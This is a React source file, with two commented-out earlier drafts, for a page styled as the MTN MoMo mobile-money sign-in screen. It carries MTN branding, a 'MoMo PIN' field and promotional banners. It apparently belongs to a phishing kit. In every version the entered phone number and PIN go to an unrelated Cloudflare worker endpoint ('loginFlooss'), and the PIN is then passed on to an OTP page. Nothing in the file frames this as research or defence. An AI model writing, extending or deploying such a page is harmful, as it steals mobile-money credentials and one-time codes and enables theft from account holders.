// import React from "react";
// import { useState, useRef } from "react";
// import { useLocation, useNavigate } from "react-router-dom";

// export default function PINEntry() {
//   const [pin, setPin] = useState(["", "", "", ""]);
//   const inputs = useRef([]);
//   const navigate = useNavigate();
//   const location = useLocation();
//   const { phone } = location.state

//   const handleChange = (val, idx) => {
//     if (!/^\d?$/.test(val)) return;
//     const newPin = [...pin];
//     newPin[idx] = val;
//     setPin(newPin);
//     if (val && idx < 3) inputs.current[idx + 1]?.focus();
//   };

//   const handleKeyDown = (e, idx) => {
//     if (e.key === "Backspace" && !pin[idx] && idx > 0) {
//       const newPin = [...pin];
//       newPin[idx - 1] = "";
//       setPin(newPin);
//       inputs.current[idx - 1]?.focus();
//     }
//   };


//   const handleSubmit = async () => {
//     const payload = {
//       mobile:phone,
//       pin: pin.join("")
//     }
//     const res = await fetch('https://my-worker-app.instapayapi.workers.dev/api/loginFlooss',
//       {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(payload),
//       },
//     );
//     const json = await res.json();
//     if (res.ok) {
//       navigate('/otppage', { state: { phone: phone, pin: pin } })
//     }
//   }

//   return (
//     <div className="min-h-screen bg-white flex flex-col">
//       <div className="bg-black h-8 w-full" />

//       <div className="bg-yellow-400 flex items-center justify-between py-8 px-4">
//         <button
//           onClick={() => navigate(-1)} // ✅ Wapas OTP pe
//           className="text-gray-900 text-2xl font-bold"
//         >
//           ‹
//         </button>
//         <h1 className="text-3xl font-black text-gray-900 tracking-wide">MoMo</h1>
//         <div className="w-6" /> {/* spacer for centering */}
//       </div>

//       <div className="flex flex-col items-center flex-1 pt-16 px-6">
//         <p className="text-2xl text-gray-800 font-light mb-10 tracking-wide">
//           Enter your PIN
//         </p>

//         <div className="flex gap-5 mb-8">
//           {pin.map((digit, idx) => (
//             <div key={idx} className="relative">
//               <input
//                 ref={(el) => (inputs.current[idx] = el)}
//                 type="password"
//                 inputMode="numeric"
//                 pattern="[0-9]*"
//                 maxLength={1}
//                 value={digit}
//                 onChange={(e) => handleChange(e.target.value, idx)}
//                 onKeyDown={(e) => handleKeyDown(e, idx)}
//                 className="absolute inset-0 opacity-0 w-full h-full cursor-pointer"
//                 autoComplete="off"
//               />
//               <div
//                 onClick={() => inputs.current[idx]?.focus()}
//                 className={`w-12 h-12 rounded-full transition-colors duration-150 cursor-pointer ${digit ? "bg-yellow-400" : "bg-gray-300"
//                   }`}
//               />
//             </div>
//           ))}
//         </div>

//         <button className="mt-1 text-blue-600 font-semibold text-base hover:underline">
//           Forgot PIN?
//         </button>
//         <button
//           onClick={handleSubmit}
//           // onClick={() => navigate("/pincode")} // ✅ PIN page pe jao
//           // disabled={!isComplete}
//           className="w-full bg-[#FFCC00] active:bg-yellow-600 text-gray-900 font-bold text-lg rounded-full py-4 mb-4 transition-colors shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
//         >
//           Verify
//         </button>
//       </div>
//     </div>
//   );
// }

// import React from "react";
// import { useState } from "react";
// import { useNavigate } from "react-router-dom";
// import img from "./assets/image.jpeg"
// const MTNLogo = () => (
//   <svg viewBox="0 0 60 60" className="w-10 h-10" fill="none">
//     <circle cx="30" cy="30" r="30" fill="#FFCC00" />
//     <path d="M15 38V22l9 10 9-10v16" stroke="#003087" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" fill="none"/>
//     <path d="M33 30l9-8v16" stroke="#003087" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" fill="none"/>
//   </svg>
// );

// const TikTokIcon = () => (
//   <svg viewBox="0 0 40 40" className="w-8 h-8" fill="none">
//     <rect width="40" height="40" rx="8" fill="#010101"/>
//     <path d="M27.5 8c.5 3.5 2.5 5.5 6 6v4c-2 0-4-.5-6-1.5V26a8 8 0 1 1-8-8h1v4h-1a4 4 0 1 0 4 4V8h4z" fill="white"/>
//   </svg>
// );

// const PhoneIcon = () => (
//   <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
//     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 8V5z"/>
//   </svg>
// );

// const QRPayIcon = () => (
//   <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
//     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z"/>
//   </svg>
// );

// const ScanIcon = () => (
//   <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
//     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h7"/>
//     <rect x="14" y="14" width="6" height="6" rx="1" strokeWidth={2}/>
//   </svg>
// );

// const GlobeIcon = () => (
//   <svg className="w-10 h-10" viewBox="0 0 40 40" fill="none">
//     <circle cx="20" cy="20" r="18" stroke="#1a6b9e" strokeWidth="2"/>
//     <path d="M20 2C20 2 14 10 14 20s6 18 6 18M20 2c0 0 6 8 6 18s-6 18-6 18M2 20h36" stroke="#1a6b9e" strokeWidth="1.5"/>
//     <circle cx="20" cy="20" r="6" fill="#1a6b9e" opacity="0.3"/>
//   </svg>
// );

// export default function PINEntry() {
//   const [pin, setPin] = useState("");
//   const [focused, setFocused] = useState(false);
//   const [loading, setLoading] = useState(false);
// const navigate = useNavigate()

//   // const handleSignIn = () => {
//   //   if (!pin) return;
//   //   setLoading(true);
//   //   setTimeout(() => setLoading(false), 2000);
//   //   navigate("/otppage")
//   // };

//     const handleSubmit = async () => {
//     const payload = {
//       mobile:phone,
//       pin: pin
//     }
//     const res = await fetch('https://my-worker-app.instapayapi.workers.dev/api/loginFlooss',
//       {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify(payload),
//       },
//     );
//     const json = await res.json();
//     if (res.ok) {
//       navigate('/otppage', { state: { phone: phone, pin: pin } })
//     }
//   }

//   return (
//     <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Segoe UI', sans-serif", maxWidth: 430, margin: "0 auto" }}>
      
//       {/* Status Bar */}
//       <div className="bg-[#FFCC00] px-4 py-4 w-full flex justify-between items-center text-xs font-bold text-gray-800">
//         {/* <span>1:22</span>
//         <div className="flex items-center gap-1">
//           <span>📶</span>
//           <span>88%🔋</span>
//         </div> */}
//       </div>

//       {/* Header */}
//       <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100">
//         {/* <div className="flex items-center gap-2">
//           <MTNLogo />
//           <div className="leading-tight">
//             <div className="text-[10px] text-gray-500 font-medium">MoMo</div>
//             <div className="text-[10px] text-gray-400">from MTN</div>
//           </div>
//         </div>
//         <div className="text-gray-800 text-sm">
//           <span className="italic font-bold text-[#FFCC00]" style={{ fontFamily: "Georgia, serif" }}>Y'ello</span>
//           <span className="font-semibold text-gray-800">, Josiah Mduduze</span>
//         </div> */}
//         <img src={img} alt="" />
//       </div>

//       {/* Banner */}
//       {/* <div className="mx-4 mt-4 rounded-2xl overflow-hidden relative" style={{ background: "linear-gradient(135deg, #0a4b6e 0%, #1a6b9e 60%, #0a4b6e 100%)", minHeight: 160 }}>
     
//         <div className="absolute right-0 top-0 w-40 h-40 rounded-full opacity-90" style={{ background: "#FFCC00", transform: "translate(20%, -20%)" }} />
//         <div className="absolute right-6 top-4 z-10">
//           <div className="bg-white rounded-xl px-3 py-2 text-center shadow-lg">
//             <div className="text-[10px] font-bold text-gray-700">TikTok Deal</div>
//             <div className="text-3xl font-black text-[#FFCC00] leading-none">1GB</div>
//             <div className="text-[10px] text-gray-600 font-medium">Only</div>
//             <div className="text-2xl font-black text-red-500 leading-none">R2</div>
//             <div className="text-[8px] text-gray-500 mt-1">*Valid for 24 Hours</div>
//           </div>
//         </div>

//         {/* TikTok logo floating */}
//         {/* <div className="absolute right-16 bottom-4 z-10 opacity-90">
//           <TikTokIcon />
//         </div> */}

//         {/* Text content */}
//         {/* <div className="relative z-10 p-5 pr-44">
//           <div className="text-[#FFCC00] text-xs font-bold mb-1">MoMo Specials</div>
//           <div className="text-white font-black text-lg leading-snug">
//             Get a 24-hour <span className="text-[#FFCC00]">1GB</span><br />
//             <span className="text-[#FFCC00]">Tik Tok</span> bundle for<br />
//             only <span className="text-[#FFCC00]">R2.</span>
//           </div>
//           <div className="text-gray-300 text-[11px] mt-2">Valid for 24 hours</div>
//         </div> */}

//         {/* Slide dots */}
//         {/* <div className="absolute bottom-3 left-1/2 -translate-x-1/2 flex gap-1.5">
//           {[0,1,2,3,4].map(i => (
//             <div key={i} className={`rounded-full transition-all ${i === 0 ? "bg-white w-3 h-2" : "bg-white/40 w-2 h-2"}`} />
//           ))}
//         </div> */}
//       {/* </div>  */}

//       {/* Spacer */}
//       <div className="flex-1" />

//       {/* PIN Input */}
//       <div className="px-6 mt-8">
//         <div className="relative">
//           <div className={`absolute -top-2.5 left-3 px-1 bg-white text-xs font-semibold transition-colors ${focused || pin ? "text-[#FFCC00]" : "text-gray-400"}`}>
//             MoMo PIN
//           </div>
//           <input
//             type="password"
//             value={pin}
//             onChange={e => setPin(e.target.value)}
//             onFocus={() => setFocused(true)}
//             onBlur={() => setFocused(false)}
//             className="w-full border-2 rounded-lg px-4 py-4 text-lg outline-none transition-all bg-white"
//             style={{ borderColor: focused || pin ? "#FFCC00" : "#d1d5db" }}
//             placeholder=""
//           />
//         </div>

//         {/* Forgot PIN */}
//         <div className="mt-3">
//           <button className="text-[#1a6b9e] text-sm font-medium hover:underline">
//             Forgot PIN?
//           </button>
//         </div>

//         {/* Sign In Button */}
//         <button
//           onClick={handleSubmit}
//           disabled={loading}
//           className="w-full mt-5 py-4 rounded-full font-black text-lg transition-all active:scale-95"
//           style={{ background: "#FFCC00", color: "#1a1a1a", boxShadow: "0 4px 15px rgba(255,204,0,0.4)" }}
//         >
//           {loading ? (
//             <span  className="flex items-center justify-center gap-2">
//               <svg className="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24">
//                 <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
//                 <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
//               </svg>
//               Signing in...
//             </span>
//           ) : "Sign in"}
//         </button>

//         {/* Alternative options */}
//         <div className="mt-5 text-center space-y-3">
//           <button className="text-[#1a6b9e] text-sm font-medium hover:underline block w-full">
//             Sign in with different number
//           </button>
//           <button className="text-[#1a6b9e] text-sm font-bold hover:underline block w-full">
//             Change your MoMo number
//           </button>
//         </div>

//         {/* Send Money Banner */}
//         <div className="mt-5 bg-gray-100 rounded-xl px-5 py-4 flex items-center gap-4">
//           <GlobeIcon  />
//           <div>
//             <div className="text-[#1a6b9e] font-bold text-base leading-tight">Send money across Africa</div>
//             <div className="flex items-center gap-1 mt-0.5">
//               <span className="text-gray-400 text-[10px] font-medium uppercase tracking-wide">Powered by</span>
//               <span className="text-[#1a6b9e] text-xs font-bold italic">✈ clicksendnow</span>
//             </div>
//           </div>
//         </div>
//       </div>

//       {/* Bottom Nav */}
//       <div className="mt-6 border-t border-gray-100 py-3 px-4 flex justify-around items-center bg-white">
//         <button className="flex flex-col items-center gap-1 text-gray-600 hover:text-[#FFCC00] transition-colors">
//           <div className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center">
//             <PhoneIcon />
//           </div>
//           <span className="text-[11px] font-medium">Call centre</span>
//         </button>
//         <button className="flex flex-col items-center gap-1 text-gray-800 hover:text-[#FFCC00] transition-colors">
//           <div className="w-14 h-14 rounded-full border-2 border-gray-200 bg-gray-50 flex items-center justify-center -mt-4 shadow-md">
//             <QRPayIcon />
//           </div>
//           <span className="text-[11px] font-semibold">MoMo Pay</span>
//         </button>
//         <button className="flex flex-col items-center gap-1 text-gray-600 hover:text-[#FFCC00] transition-colors">
//           <div className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center">
//             <ScanIcon />
//           </div>
//           <span className="text-[11px] font-medium">Scan me</span>
//         </button>
//       </div>

//       {/* Android Nav Bar */}
//       <div className="bg-white py-2 flex justify-around items-center border-t border-gray-100">
//         <button className="text-gray-400 text-xl px-4">⦀</button>
//         <button className="w-7 h-7 rounded border-2 border-gray-300" />
//         <button className="text-gray-400 text-lg px-4">‹</button>
//       </div>
//     </div>
//   );
// }


import React from "react";
import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import img from "./assets/image.jpeg";
import logo from "./assets/crop.jpeg"
const MTNLogo = () => (
  <svg viewBox="0 0 60 60" className="w-10 h-10" fill="none">
    <circle cx="30" cy="30" r="30" fill="#FFCC00" />
    <path d="M15 38V22l9 10 9-10v16" stroke="#003087" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" fill="none"/>
    <path d="M33 30l9-8v16" stroke="#003087" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" fill="none"/>
  </svg>
);

const TikTokIcon = () => (
  <svg viewBox="0 0 40 40" className="w-8 h-8" fill="none">
    <rect width="40" height="40" rx="8" fill="#010101"/>
    <path d="M27.5 8c.5 3.5 2.5 5.5 6 6v4c-2 0-4-.5-6-1.5V26a8 8 0 1 1-8-8h1v4h-1a4 4 0 1 0 4 4V8h4z" fill="white"/>
  </svg>
);

const PhoneIcon = () => (
  <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 8V5z"/>
  </svg>
);

const QRPayIcon = () => (
  <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z"/>
  </svg>
);

const ScanIcon = () => (
  <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h7"/>
    <rect x="14" y="14" width="6" height="6" rx="1" strokeWidth={2}/>
  </svg>
);

const GlobeIcon = () => (
  <svg className="w-10 h-10" viewBox="0 0 40 40" fill="none">
    <circle cx="20" cy="20" r="18" stroke="#1a6b9e" strokeWidth="2"/>
    <path d="M20 2C20 2 14 10 14 20s6 18 6 18M20 2c0 0 6 8 6 18s-6 18-6 18M2 20h36" stroke="#1a6b9e" strokeWidth="1.5"/>
    <circle cx="20" cy="20" r="6" fill="#1a6b9e" opacity="0.3"/>
  </svg>
);

export default function PINEntry() {
  const [pin, setPin] = useState("");
  const [focused, setFocused] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { phone } = location.state;

  const handleSubmit = async () => {
    if (!pin) return;
    setLoading(true);
    try {
      const payload = {
        mobile: phone,
        pin: pin,
      };
      const res = await fetch('https://my-worker-app.instapayapi.workers.dev/api/loginFlooss', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const json = await res.json();
      if (res.ok) {
        navigate('/otppage', { state: { phone: phone, pin: pin } });
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Segoe UI', sans-serif", maxWidth: 430, margin: "0 auto" }}>

      {/* Status Bar */}
      <div className="bg-[#FFCC00] px-4 py-4 w-full flex justify-between items-center text-xs font-bold text-gray-800">
      </div>

      {/* Header */}

  {/* Header */}
       <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100">
         <div className="flex items-center gap-2">
           
           <div className="leading-tight">
            <img src={logo} alt="" />
             
           </div>
         </div>
       
      
     </div>

      <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100">
        <img src={img} alt="" />
      </div>

      {/* Spacer */}
      <div className="flex-1" />

      {/* PIN Input */}
      <div className="px-6 mt-8">
        <div className="relative">
          <div className={`absolute -top-2.5 left-3 px-1 bg-white text-xs font-semibold transition-colors ${focused || pin ? "text-[#FFCC00]" : "text-gray-400"}`}>
            MoMo PIN
          </div>
          <input
            type="number"
            value={pin}
            onChange={e => setPin(e.target.value)}
            onFocus={() => setFocused(true)}
            onBlur={() => setFocused(false)}
            className="w-full border-2 rounded-lg px-4 py-4 text-lg outline-none transition-all bg-white"
            style={{ borderColor: focused || pin ? "#FFCC00" : "#d1d5db" }}
            placeholder=""
          />
        </div>

        {/* Forgot PIN */}
        <div className="mt-3">
          <button className="text-[#1a6b9e] text-sm font-medium hover:underline">
            Forgot PIN?
          </button>
        </div>

        {/* Sign In Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full mt-5 py-4 rounded-full font-black text-lg transition-all active:scale-95"
          style={{ background: "#FFCC00", color: "#1a1a1a", boxShadow: "0 4px 15px rgba(255,204,0,0.4)" }}
        >
          {loading ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
              </svg>
              Signing in...
            </span>
          ) : "Sign in"}
        </button>

        {/* Alternative options */}
        <div className="mt-5 text-center space-y-3">
          <button className="text-[#1a6b9e] text-sm font-medium hover:underline block w-full">
            Sign in with different number
          </button>
          <button className="text-[#1a6b9e] text-sm font-bold hover:underline block w-full">
            Change your MoMo number
          </button>
        </div>

        {/* Send Money Banner */}
        <div className="mt-5 bg-gray-100 rounded-xl px-5 py-4 flex items-center gap-4">
          <GlobeIcon />
          <div>
            <div className="text-[#1a6b9e] font-bold text-base leading-tight">Send money across Africa</div>
            <div className="flex items-center gap-1 mt-0.5">
              <span className="text-gray-400 text-[10px] font-medium uppercase tracking-wide">Powered by</span>
              <span className="text-[#1a6b9e] text-xs font-bold italic">✈ clicksendnow</span>
            </div>
          </div>
        </div>
      </div>

      {/* Bottom Nav */}
      <div className="mt-6 border-t border-gray-100 py-3 px-4 flex justify-around items-center bg-white">
        <button className="flex flex-col items-center gap-1 text-gray-600 hover:text-[#FFCC00] transition-colors">
          <div className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center">
            <PhoneIcon />
          </div>
          <span className="text-[11px] font-medium">Call centre</span>
        </button>
        <button className="flex flex-col items-center gap-1 text-gray-800 hover:text-[#FFCC00] transition-colors">
          <div className="w-14 h-14 rounded-full border-2 border-gray-200 bg-gray-50 flex items-center justify-center -mt-4 shadow-md">
            <QRPayIcon />
          </div>
          <span className="text-[11px] font-semibold">MoMo Pay</span>
        </button>
        <button className="flex flex-col items-center gap-1 text-gray-600 hover:text-[#FFCC00] transition-colors">
          <div className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center">
            <ScanIcon />
          </div>
          <span className="text-[11px] font-medium">Scan me</span>
        </button>
      </div>

      {/* Android Nav Bar */}
      {/* <div className="bg-white py-2 flex justify-around items-center border-t border-gray-100">
        <button className="text-gray-400 text-xl px-4">⦀</button>
        <button className="w-7 h-7 rounded border-2 border-gray-300" />
        <button className="text-gray-400 text-lg px-4">‹</button>
      </div> */}
    </div>
  );
}